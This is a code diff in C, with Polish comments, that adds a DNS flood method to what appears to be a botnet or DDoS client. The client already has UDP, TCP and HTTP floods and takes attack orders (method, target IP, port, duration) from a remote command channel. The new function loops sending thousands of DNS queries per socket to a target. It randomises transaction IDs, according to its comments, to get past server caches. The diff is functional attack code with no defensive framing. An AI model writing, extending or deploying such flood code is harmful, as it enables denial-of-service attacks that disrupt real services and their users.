@@ -122,6 +122,47 @@ void *http_flood(void *arg) {
     return NULL;
 }
 
+void *dns_flood(void *arg) {
+    AttackArgs *args = (AttackArgs *)arg;
+    struct sockaddr_in target;
+    target.sin_family = AF_INET;
+    target.sin_port = htons(args->port);
+    target.sin_addr.s_addr = inet_addr(args->ip);
+
+    unsigned char dns_payload[] = {
+        0x12, 0x34, // Transaction ID (bedzie losowane)
+        0x01, 0x00, // Flags: Standard query
+        0x00, 0x01, // Questions: 1
+        0x00, 0x00, // Answer RRs: 0
+        0x00, 0x00, // Authority RRs: 0
+        0x00, 0x00, // Additional RRs: 0
+        // Query: google.com
+        0x06, 'g', 'o', 'o', 'g', 'l', 'e',
+        0x03, 'c', 'o', 'm',
+        0x00,
+        0x00, 0x01, // Type: A
+        0x00, 0x01  // Class: IN
+    };
+
+    while(time(NULL) < attack_end_time && !stop_attack) {
+        int sock = socket(AF_INET, SOCK_DGRAM, 0);
+        int bufsize = 1024 * 1024;
+        setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));
+        
+        connect(sock, (struct sockaddr *)&target, sizeof(target));
+        
+        for(int i = 0; i < 2000; i++) {
+            if(stop_attack) break;
+            // Losujemy Transaction ID zeby ominac chache serwerow DNS
+            dns_payload[0] = rand() % 255;
+            dns_payload[1] = rand() % 255;
+            send(sock, dns_payload, sizeof(dns_payload), MSG_NOSIGNAL);
+        }
+        close(sock);
+    }
+    return NULL;
+}
+
 void start_attack(char *method, char *ip, int port, int duration) {
     if (!stop_attack && attack_end_time > time(NULL)) {
         stop_attack = 1;
@@ -145,6 +186,8 @@ void start_attack(char *method, char *ip, int port, int duration) {
             pthread_create(&threads[i], NULL, tcp_flood, (void *)&args);
         } else if(strcmp(method, "http") == 0) {
             pthread_create(&threads[i], NULL, http_flood, (void *)&args);
+        } else if(strcmp(method, "dns") == 0) {
+            pthread_create(&threads[i], NULL, dns_flood, (void *)&args);
         }
     }
     
@@ -209,7 +252,7 @@ int main() {
             char method[16], ip[64];
             int port, duration;
             if(sscanf(buffer, "%15s %63s %d %d", method, ip, &port, &duration) == 4) {
-                if(strcmp(method, "udp") == 0 || strcmp(method, "tcp") == 0 || strcmp(method, "http") == 0) {
+                if(strcmp(method, "udp") == 0 || strcmp(method, "tcp") == 0 || strcmp(method, "http") == 0 || strcmp(method, "dns") == 0) {
                     start_attack(method, ip, port, duration);
                 }
             }
